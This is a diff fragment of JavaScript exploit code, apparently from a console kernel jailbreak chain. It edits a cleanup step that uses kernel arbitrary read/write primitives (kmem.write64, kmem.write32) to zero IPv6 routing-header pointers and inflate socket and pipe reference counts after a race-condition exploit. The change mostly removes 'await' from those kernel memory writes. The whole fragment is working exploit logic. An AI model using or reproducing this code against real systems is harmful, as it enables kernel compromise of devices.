@@ -1500,17 +1500,17 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
 
 /*for (const sock of sds) {
-  const pktopts = await get_sock_pktopts(sock, kmem.read64);
-  await kmem.write64(pktopts + off_ip6po_rthdr, 0n);
+  const pktopts =  get_sock_pktopts(sock, kmem.read64);
+  kmem.write64(pktopts + off_ip6po_rthdr, 0n);
 }
 */
-await kmem.write64(r_pktopts + off_ip6po_rthdr, 0n);
-await kmem.write64(w_pktopts + off_ip6po_rthdr, 0n);
+ kmem.write64(r_pktopts + off_ip6po_rthdr, 0n);
+ kmem.write64(w_pktopts + off_ip6po_rthdr, 0n);
 
 const reclaimer_pktopts = await get_sock_pktopts(reclaim_sock, kmem.read64);
 const worker_pktopts = await get_sock_pktopts(worker_sock, kmem.read64);
-await kmem.write64(reclaimer_pktopts + off_ip6po_rthdr, 0n);
-await kmem.write64(worker_pktopts + off_ip6po_rthdr, 0n);
+ kmem.write64(reclaimer_pktopts + off_ip6po_rthdr, 0n);
+ kmem.write64(worker_pktopts + off_ip6po_rthdr, 0n);
 
 const increase_refs = [
   ipv6_kernel_rw.data.master_sock,
@@ -1520,11 +1520,11 @@ const increase_refs = [
   reclaim_sock,
 ];
 for (const fd of increase_refs) {
-  const sock_addr = await get_fd_data_addr(fd, kmem.read64);
-  await kmem.write32(sock_addr + 0x0n, 0x100);  // so_count
+  const sock_addr =await  get_fd_data_addr(fd, kmem.read64);
+   kmem.write32(sock_addr + 0x0n, 0x100);  // so_count
 }
 
-await kmem.write32(pipe_file.add(0x28n), await kmem.read32(pipe_file.add(0x28n)) + 2);
+ kmem.write32(pipe_file.add(0x28n),  kmem.read32(pipe_file.add(0x28n)) + 2);
 
 log("[+] IPv6 race structures and refcounts fixed");
 
